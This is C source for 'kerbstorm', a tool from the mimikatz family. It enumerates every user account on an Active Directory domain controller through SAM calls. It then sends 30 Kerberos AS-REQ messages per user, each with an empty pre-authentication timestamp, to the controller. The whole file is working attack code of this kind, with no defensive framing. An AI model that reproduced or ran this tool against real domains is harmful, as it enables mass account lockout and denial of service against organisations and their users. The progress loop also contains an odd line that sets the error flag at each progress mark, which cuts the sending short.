/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by-nc-sa/4.0/
*/
#include "kerbstorm.h"

BOOL g_isSockInit = FALSE;
LIST_ENTRY gUserList = {&gUserList, &gUserList};

BOOL init()
{
	BOOL status = FALSE;
	RtlGetNtVersionNumbers(&MIMIKATZ_NT_MAJOR_VERSION, &MIMIKATZ_NT_MINOR_VERSION, &MIMIKATZ_NT_BUILD_NUMBER);
	MIMIKATZ_NT_BUILD_NUMBER &= 0x00003fff;
	if(g_isSockInit = kull_m_sock_startup())
		status = TRUE;
	return status;
}

BOOL term()
{
	if(g_isSockInit)
		g_isSockInit = !kull_m_sock_finish();

	return !(g_isSockInit);
}

BOOL add(PCUNICODE_STRING name)
{
	BOOL status = FALSE;
	PKIWI_USERNAMEA ua;
	if(ua = (PKIWI_USERNAMEA) LocalAlloc(LPTR, sizeof(KIWI_USERNAMEA)))
	{
		ua->navigator.Blink = gUserList.Blink;
		ua->navigator.Flink = &gUserList;
		((PKIWI_USERNAMEA) gUserList.Blink)->navigator.Flink = (PLIST_ENTRY) ua;
		gUserList.Blink= (PLIST_ENTRY) ua;
		status = NT_SUCCESS(RtlUnicodeStringToAnsiString(&ua->username, name, TRUE));
	}
	return status;
}

int main(int argc, char * argv[])
{
	BOOL sockError = FALSE;
	DWORD retry, i, j, total, f, th, dataOutSize;
	PBERVAL pBerVal = NULL;
	KULL_M_SOCK fullsocket;
	PVOID dataOut;
	PKIWI_USERNAMEA entry, tmp;
	FILETIME fTime;
	LPCSTR szDc, szDomain, szNum;

	kprintf("\n"
		"  .#####.   " MIMIKATZ_FULL "\n"
		" .## ^ ##.  " MIMIKATZ_SECOND "\n"
		" ## / \\ ##  /* * *\n"
		" ## \\ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\n"
		" '## v ##'   http://blog.gentilkiwi.com                      (oe.eo)\n"
		"  '#####'                                                     * * */\n\n");

	if(init())
	{
		if(kull_m_string_args_byName(argc, argv, "dc", &szDc, NULL) && kull_m_string_args_byName(argc, argv, "domain", &szDomain, NULL))
		{
			kull_m_string_args_byName(argc, argv, "retry", &szNum, "20");
			retry = strtoul(szNum, NULL, 0);
			kprintf("DC name    : %s\nDomain FQDN: %s\nLogon retry: %u\n\n", szDc, szDomain, retry);
			GetSystemTimeAsFileTime(&fTime); kprintf("> Retrieving user list : "); kull_m_string_displayLocalFileTime(&fTime); kprintf("\n");
			if(total = giveUsersForServer(szDc))
			{
				GetSystemTimeAsFileTime(&fTime); kprintf("> End of user list     : "); kull_m_string_displayLocalFileTime(&fTime); kprintf("\n");
				if(kull_m_sock_initSocket(szDc, KERBEROS_DEFAULT_PORT, IPPROTO_TCP, &fullsocket))
				{
					GetSystemTimeAsFileTime(&fTime); kprintf("> Sending AS-REQ       : "); kull_m_string_displayLocalFileTime(&fTime); kprintf("\n");
					for(entry = (PKIWI_USERNAMEA) gUserList.Flink, j = 1, th = 1; !sockError && (entry != (PKIWI_USERNAMEA) &gUserList); entry = (PKIWI_USERNAMEA) entry->navigator.Flink, j++)
					{
						f = (DWORD) (((FLOAT) j / total) * 100);
						if(f == th)
						{
							printf("|");
							if((f % 10) == 0)
								printf(" ");
							if((f % 20) == 0)
								printf("\n");
							th++;sockError = TRUE;
						}

						if(pBerVal = giveBERForUser(&entry->username, szDomain))
						{
							for(i = 0; !sockError && (i < 30); i++)
								if(kull_m_sock_kerberos_SendAndRecv(&fullsocket, pBerVal->bv_val, pBerVal->bv_len, &dataOut, &dataOutSize))
									LocalFree(dataOut);
								else sockError = TRUE;
								ber_bvfree(pBerVal);
						}
					}
					GetSystemTimeAsFileTime(&fTime); kprintf("> End of AS-REQ      : "); kull_m_string_displayLocalFileTime(&fTime); kprintf("\n");
					kull_m_sock_termSocket(&fullsocket);
				}

				GetSystemTimeAsFileTime(&fTime); kprintf("> Free user list       : "); kull_m_string_displayLocalFileTime(&fTime); kprintf("\n");
				for(entry = (PKIWI_USERNAMEA) gUserList.Flink; entry != (PKIWI_USERNAMEA) &gUserList; entry = tmp)
				{
					tmp = (PKIWI_USERNAMEA) entry->navigator.Flink;
					RtlFreeAnsiString(&entry->username);
					LocalFree(entry);
				}
				GetSystemTimeAsFileTime(&fTime); kprintf("> End of user list     : "); kull_m_string_displayLocalFileTime(&fTime); kprintf("\n");
			}
			else PRINT_ERROR("unable to get users\n");
		}
		else PRINT_ERROR("/dc:<dc.fqdn.local> /domain:<fqdn.local> required\n");
		term();
	}
	else PRINT_ERROR("init() failed\n");
	return 0;
}

const BYTE
	reqFlags[] = {0x00, 0x40, 0x80, 0x00, 0x10},
	nullPATS[] = {0x30, 0x36, 0xa0, 0x03, 0x02, 0x01, 0x17, 0xa2, 0x2f, 0x04, 0x2d, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
PBERVAL giveBERForUser(PCANSI_STRING user, PCSTR domain)
{
	BerElement *pBer;
	PBERVAL pBerVal = NULL;
	if(pBer = ber_alloc_t(LBER_USE_DER))
	{
		ber_printf(pBer,"t{{"
							"t{i}"
								"t{i}"
								"t{{"
									"{t{i}t{o}}"
								"}}"
							"t{{"
								"t{X}"
								"t{{t{i}t{{to}}}}"
								"t{ts}"
								"t{{t{i}t{{tsts}}}}"
								"t{ts}"
								"t{i}"
								"t{{i}}"
							"}}"
						"}}",
						MAKE_APP_TAG(10),
							MAKE_CTX_TAG(1), 5,
							MAKE_CTX_TAG(2), 10,
							MAKE_CTX_TAG(3),
								MAKE_CTX_TAG(1), 2, MAKE_CTX_TAG(2), nullPATS, sizeof(nullPATS),
							MAKE_CTX_TAG(4),
								MAKE_CTX_TAG(0), reqFlags, sizeof(reqFlags),
								MAKE_CTX_TAG(1), MAKE_CTX_TAG(0), KRB_NT_PRINCIPAL, MAKE_CTX_TAG(1), DIRTY_ASN1_ID_GENERAL_STRING, user->Buffer, user->Length,
								MAKE_CTX_TAG(2), DIRTY_ASN1_ID_GENERAL_STRING, domain,
								MAKE_CTX_TAG(3), MAKE_CTX_TAG(0), KRB_NT_SRV_INST, MAKE_CTX_TAG(1), DIRTY_ASN1_ID_GENERAL_STRING, "krbtgt", DIRTY_ASN1_ID_GENERAL_STRING, domain,
								MAKE_CTX_TAG(5), DIRTY_ASN1_ID_GENERALIZED_TIME, "20370913024805Z",
								MAKE_CTX_TAG(7), MIMIKATZ_NONCE,
								MAKE_CTX_TAG(8), KERB_ETYPE_RC4_HMAC_NT
					);
		if(ber_flatten(pBer, &pBerVal) < 0)
			PRINT_ERROR("ber_flatten for %s@%s\n", user, domain);
		ber_free(pBer, 1);
	}
	return pBerVal;
}

DWORD giveUsersForServer(PCSTR server)
{
	NTSTATUS status, enumDomainStatus, enumUserStatus;
	ANSI_STRING aServerName;
	UNICODE_STRING serverName;
	SAMPR_HANDLE hServerHandle, hDomainHandle;
	DWORD i, j, domainEnumerationContext = 0, domainCountRetourned, userEnumerationContext, userCountRetourned, totalUsers = 0;
	PSAMPR_RID_ENUMERATION pEnumDomainBuffer, pEnumUsersBuffer;
	PSID domainSid;

	RtlInitString(&aServerName, server);
	if(NT_SUCCESS(RtlAnsiStringToUnicodeString(&serverName, &aServerName, TRUE)))
	{
		status = SamConnect(&serverName, &hServerHandle, SAM_SERVER_CONNECT | SAM_SERVER_ENUMERATE_DOMAINS | SAM_SERVER_LOOKUP_DOMAIN, FALSE);
		if(NT_SUCCESS(status))
		{
			do
			{
				enumDomainStatus = SamEnumerateDomainsInSamServer(hServerHandle, &domainEnumerationContext, &pEnumDomainBuffer, 1, &domainCountRetourned);
				if(NT_SUCCESS(enumDomainStatus) || enumDomainStatus == STATUS_MORE_ENTRIES)
				{
					for(i = 0; i < domainCountRetourned; i++)
					{
						status = SamLookupDomainInSamServer(hServerHandle, &pEnumDomainBuffer[i].Name, &domainSid);
						if(NT_SUCCESS(status))
						{
							if(((PISID) domainSid)->SubAuthorityCount && (((PISID) domainSid)->SubAuthority[0] == SECURITY_BUILTIN_DOMAIN_RID))
								continue;
							kprintf("Domain name : %wZ\n", &pEnumDomainBuffer[i].Name);
							kprintf("Domain SID  : "); kull_m_string_displaySID(domainSid); kprintf("\n");

							status = SamOpenDomain(hServerHandle, DOMAIN_LIST_ACCOUNTS, domainSid, &hDomainHandle);
							if(NT_SUCCESS(status))
							{
								userEnumerationContext = 0;
								do
								{
									enumUserStatus = SamEnumerateUsersInDomain(hDomainHandle, &userEnumerationContext, USER_NORMAL_ACCOUNT, &pEnumUsersBuffer, 4*1024*1024, &userCountRetourned);
									if(NT_SUCCESS(enumUserStatus) || enumUserStatus == STATUS_MORE_ENTRIES)
									{
										totalUsers += userCountRetourned;
										for(j = 0; j < userCountRetourned; j++) 
											add(&pEnumUsersBuffer[j].Name);
										SamFreeMemory(pEnumUsersBuffer);
									}
									else PRINT_ERROR("SamEnumerateUsersInDomain %08x", enumUserStatus);
								}
								while(enumUserStatus == STATUS_MORE_ENTRIES);
								kprintf("Total       : %u\n", totalUsers);
								SamCloseHandle(hDomainHandle);
							}
							else PRINT_ERROR("SamOpenDomain %08x", status);
							SamFreeMemory(domainSid);
						}
						else PRINT_ERROR("SamLookupDomainInSamServer %08x", status);
					}
					SamFreeMemory(pEnumDomainBuffer);
				}
				else PRINT_ERROR("SamEnumerateDomainsInSamServer %08x\n", enumDomainStatus);
			}
			while(enumDomainStatus == STATUS_MORE_ENTRIES);
			SamCloseHandle(hServerHandle);
		}
	}
	return totalUsers;
}